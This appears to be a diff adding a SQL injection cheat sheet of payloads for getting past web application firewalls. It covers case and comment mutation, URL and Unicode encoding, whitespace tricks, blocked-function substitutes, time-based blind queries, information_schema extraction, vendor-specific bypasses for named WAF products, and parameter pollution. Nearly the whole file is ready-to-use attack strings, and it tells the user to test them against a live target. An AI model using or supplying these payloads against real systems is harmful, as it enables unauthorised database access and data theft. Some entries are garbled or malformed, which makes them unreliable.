@@ -1,0 +1,106 @@
+# SQLI WAF BYPASS (2026)
+# Order: 1) identify blocker (keyword / char / encoding) 2) mutate 3) retest.
+# Test each against the live box; pairs go through with '1'='1 and reject with '1'='2.
+
+## 1) Case + mixed + separator mutation
+1' Or 1=1-- -
+1' aNd 1=1-- -
+1' UnIoN sElEcT nULL-- -
+1' AnD sLeEp(5)-- -
+1' or/**/1=1-- -
+1' UNION/**/SELECT NULL-- -
+1'/*!UNION*//*!SELECT*/NULL-- -
+1'/*!50000UNION*/SELECT NULL-- -
+1' /*!99999 SELECT * FROM users */-- -
+
+## 2) Comment crutches
+1'/**/OR/**/1=1-- -
+1'/**/AND/**/SLEEP(5)-- -
+1'--+
+1'-- -
+1'--%09
+1'/**/-- -
+1'/*--
+1'#
+
+## 3) Encoding layers (send once; retest at each layer)
+%27%20OR%201=1--            # URL
+%2527%2520OR%25201%253D1--  # double
+1%27%20%6f%72%20%31%3d%31%20%2d%2d%20   # lowercase hex of or/1=1/--
+%u0027 OR 1=1--             # Unicode (IIS .NET)
+1'%00 OR 1=1--              # null byte
+1'%3B%00--                  # ; + null
+%27||1=1--                  # Oracle || concat
+%252f%252a*/OR 1=1--
+
+## 4) Terminator-ONLY (skip real keyword, let DB complete the rest)
+' -- -                       # comment the build
+1'-- -                       # drop WHERE id=...
+1'#
+1%27%23
+' /*-*/-- -                  # some WAF strip only '-- '
+1' /*+1=1-- -                # Oracle hint
+1')-- -
+1'))-- -
+
+## 5) No-semicolon stacked equivalent: IF()/CASE latches (single expression results, no ;)
+1' AND IF(1=1,SLEEP(5),0)-- -               # MySQL
+1' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END-- -    # PG
+1' AND CASE WHEN 1=1 THEN 'a' ELSE 'b' END='a'-- -   # generic
+# WAFs regex sleep\(...\) loosely; mutate: SLEEPA(), SLeEP(), sLeEp(_x___)
+
+## 6) Replace blocked functions with equivalents
+SLEEP(5)   ->  BENCHMARK(5000000,MD5('x'))        # MySQL
+SLEEP(5)   ->  (SELECT SLEEP(5))                   # wrapped
+pg_sleep(5)->  (SELECT pg_sleep(5))                # wrapped
+WAITFOR    ->  heavy cartesian join (see blind file)
+database() ->  (SELECT schema())  (SELECT current_database())
+
+## 7) Whitespace replacement (blocks ' ' keyword filter)
+1'+OR+1=1-- -                 # + in URL/GET
+1'%09OR%091=1-- -             # tab
+1'%0aOR%0a1=1-- -             # newline (lazy WAFs miss)
+1'%0bOR%0b1=1--
+1'%0cOR%0c1=1--
+1'%0dOR%0d1=1--
+1'/**/OR/**/1=1-- -           # comment as space
+
+## 8) String/quote filters
+1 OR 1=1-- -                  # no quotes needed in numeric context
+1' OR 'a'='a
+1'||'a'='a                    # concat
+1' OR CHAR(97)='a             # char()
+SUPERSELECT from funcs(NO O R)
+1' OR LENGTH('a')=1-- -       # avoids = 'a'
+1' OR 'a'||1>0-- -
+
+## 9) WAF-specific (updated)
+# Cloudflare - old-school CRLF / IIS UNICODE trick (mostly dead, keep tried list short)
+1%0dra=1%0d&b=1' OR 1=1-- -
+# AWS WAF (managed rules) - terminator-only + IF-latch + count-based:
+1' AND 1-1=0-- -   /   1' AND 1+1=2-- -   /   1'AND'1'='1
+# ModSec/CRS - hex-encode alpha, use */ CRLF comment:
+1' AND 0x313D31-- -
+# Akamai - nested comments + count tricks: 1' /*!OR*/ decode-- -
+# F5 - pipe/dash apostrophe 1' || 1=1 -- -
+# Imperva - known to pass tab+parenthesis: 1'%09AND%09(1=1)-- -
+
+## 10) Burp/lab-verified heavy hitters (2024-2026 curated)
+1'||(select case when substring(dbname,1,1)='a' then sleep(3) else 0 end)-- -
+1'AND(SELECT(substring((SELECT GROUP_CONCAT(table_name)FROM information_schema.tables WHERE table_schema=database()),1,1))='a')-- -
+1' AND ((SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))-- -
+# XML-encoded body (bypasses simplistic pattern matchers - stays valid for the stack):
+<xml><id>1'&#x41;ND 1=1-- -</id></xml>
+# Chunked-informed: keep 1' suffix + line-feed:
+1' AND 1=1%0a--
+
+## 11) The unkillable trio (resp. MySQL / PG / MSSQL)
+1'/**/AnD/**/(SeLeCt(1)FrOm(SeLeCt(sleep 5,1))i)-- -
+1' AND 1=1 UNION SELECT NULL,NULL FROM pg_catalog.pg_tables-- -
+1'AND(1=1)UNION(SELECT(NULL))-- -   # no spaces at all
+
+## 12) When the blocker is at a PARAMS layer (filter on $_GET)
+# Inject elsewhere: cookie header, X-Forwarded-For, Referer, saved profile fields (second-order).
+# Use HTTP Parameter Pollution to smuggle a fresh copy:
+?id=safe&id=1' UNION SELECT NULL-- -
+# JSON body double key (see 06 file).
